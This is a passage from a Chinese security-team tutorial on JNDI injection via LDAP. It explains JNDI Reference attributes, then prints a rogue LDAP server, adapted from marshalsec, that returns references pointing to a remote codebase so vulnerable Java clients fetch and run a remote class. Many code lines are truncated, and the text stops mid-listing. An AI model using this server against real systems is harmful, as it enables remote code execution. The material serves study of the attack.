2020/7/27 JNDI之初探 LDAP
JNDI之初探 LDAP
原创 队员编号027 酒仙桥六号部队 6⽉29⽇
这是 酒仙桥六号部队 的第 27 篇⽂章。
全⽂共计2890个字，预计阅读时⻓10分钟。
基础知识
在进⼊JNDI中LDAP学习前，先了解下其中涉及的相关知识。
1 JAVA模型
序列化对象
JNDI References
JNDI References 是类 javax.naming.Reference 的Java对象。它由有关所引⽤对象
的类信息和地址的有序列表组成。 Reference 还包含有助于创建引⽤所引⽤的对象实例
的信息。它包含该对象的Java类名称，以及⽤于创建对象的对象⼯⼚的类名称和位置。
在⽬录中使⽤以下属性：
1 objectClass: javaNamingReference
2 javaClassName: Records the class name of the serialized object so that a
3 object.
4 javaClassNames: Additional class information about the serialized object
5 javaCodebase: Location of the class definitions needed to instantiate th
6 class.
7 javaReferenceAddress: Multivalued optional attribute for storing referen
8 addresses.
9 javaFactory: Optional attribute for storing the object factory's fully q
10 name.
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 1/17
2020/7/27 JNDI之初探 LDAP
Marshalled 对象
Remote Location
LDAP
LDAP（Lightweight Directory Access Protocol）
轻量⽬录访问协议
1 LDAP 是什么
先简单描述下LDAP的基本概念，主要⽤于访问⽬录服务 ⽤户进⾏连接、查询、更新远
程服务器上的⽬录。
其中LDAP模型主要分布如下：
信 息 模 型 信 息 模 型 主 要 是 条 ⽬ - Entry 、 属 性 - Attribute 、 值 - value
Entry：⽬录树中的⼀个节点，每⼀个Entry描述了⼀个真实对象，即 object class
命名模型
功能模型
安全模型 ......
这些基础可以看看LDAP的官⽅⽂档。
2 LDAP 攻击向量
LDAP Server
在利⽤前，可以先搭建⼀个ldap server,代码来⾃ mbechler ，稍微改动了下。
1 package org.jndildap;
2
3 import java.net.InetAddress;
4 import java.net.MalformedURLException;
5 import java.net.URL;
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 2/17
2020/7/27 JNDI之初探 LDAP
6 import javax.net.ServerSocketFactory;
7 import javax.net.SocketFactory;
8 import javax.net.ssl.SSLSocketFactory;
9 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
10 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
11 import com.unboundid.ldap.listener.InMemoryListenerConfig;
12 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearc
13 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterce
14 import com.unboundid.ldap.sdk.Entry;
15 import com.unboundid.ldap.sdk.LDAPException;
16 import com.unboundid.ldap.sdk.LDAPResult;
17 import com.unboundid.ldap.sdk.ResultCode;
18
19 /**
20 * LDAP server implementation returning JNDI references
21 *
22 * @author mbechler
23 *
24 */
25 public class LdapSer {
26
27 private static final String LDAP_BASE = "dc=example,dc=com";
28
29
30 public static void main (String[] args) {
31 int port = 1389;
32 String url = "http://127.0.0.1/#Th3windObject";
33 try {
34 InMemoryDirectoryServerConfig config = new InMemoryDirector
35 config.setListenerConfigs(new InMemoryListenerConfig(
36 "listen", //$NON-NLS-1$
37 InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
38 port,
39 ServerSocketFactory.getDefault(),
40 SocketFactory.getDefault(),
41 (SSLSocketFactory) SSLSocketFactory.getDefault()));
42
43 config.addInMemoryOperationInterceptor(new OperationInterce
44 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(co
45 System.out.println("Listening on 0.0.0.0:" + port); //$NON-
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 3/17
2020/7/27 JNDI之初探 LDAP
46 ds.startListening();
47
48 }
49 catch ( Exception e ) {
50 e.printStackTrace();
51 }
52 }
53
54 private static class OperationInterceptor extends InMemoryOperation
55
56 private URL codebase;
57
58
59 /**
60 *
61 */
62 public OperationInterceptor ( URL cb ) {
63 this.codebase = cb;
64 }
65
66
67 /**
68 * {@inheritDoc}
69 *
70 * @see com.unboundid.ldap.listener.interceptor.InMemoryOperati
71 */
72 @Override
73 public void processSearchResult ( InMemoryInterceptedSearchResu
74 String base = result.getRequest().getBaseDN();
75 Entry e = new Entry(base);
76 try {
77 sendResult(result, base, e);
78 }
79 catch ( Exception e1 ) {
80 e1.printStackTrace();
81 }
82
83 }
84
85
https://mp.weixin.qq.com/s/Pg2bb6385Sv6ptsXAS22-g 4/17
2020/7/27 JNDI之初探 LDAP
86 protected void sendResult ( InMemoryInterceptedSearchResult res
87 URL turl = new URL(this.codebase, this.codebase.getRef().re
88 System.out.println("Send LDAP reference result for " + base
89 e.addAttribute("javaClassName", "th3wind");
90 String cbstring = this.codebase.toString();
91 int refPos = cbstring.indexOf('#');
92 if ( refPos > 0 ) {
93 cbstring = cbstring.substring(0, refPos);
94 }
95 e.addAttribute("javaCodeBase", cbstring);
96 e.addAttribute("objectClass", "javaNamingReference"); //$NO
97 e.addAttribute("javaFactory", this.codebase.getRef());
98 result.sendSearchEntry(e);
99 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
100 }
101